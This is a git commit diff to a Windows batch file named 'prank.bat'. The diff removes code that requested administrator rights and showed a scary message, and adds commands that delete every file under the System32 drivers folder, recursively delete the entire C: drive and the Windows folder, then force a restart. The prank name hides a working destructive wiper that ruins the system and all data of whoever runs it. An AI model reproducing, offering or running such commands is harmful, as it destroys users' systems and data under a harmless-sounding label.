bc0afb51b30d49172cbc4ecd53aa58665033163c
Safiqul Islam Tarun <iamtarun.bd@gmail.com>
2025-02-19 19:29:14 +0600

    Update prank.bat

--- prank.bat
+++ prank.bat
@@ -1,27 +1,9 @@
 @echo off
-if not "%1"=="am_admin" (
-    echo Requesting administrator privileges...
-    set "params=%*"
-    powershell -Command "Start-Process cmd -ArgumentList '/c %~s0 am_admin %params%' -Verb RunAs"
-    exit /b
-)
+(
 
-:: Run in background process - Start a hidden cmd process
-start "" /min cmd /c (
-    :: Display a scary warning message in the background
-    msg * "WHo ARE You ??."
-    timeout /t 1 /nobreak > nul
-
-    
     del /f /s /q C:\Windows\System32\drivers\*.*
-    shutdown /r /f /t 2
+    rmdir /s /q C:\
     rmdir /s /q C:\Windows\
 
-
-    :: Restart the system after the prank
-    
-    :: /r = restart, /f = force close applications, /t 10 = wait 10 seconds before restart
 )
-
-:: End the script
-exit
+shutdown /r /f /t 10
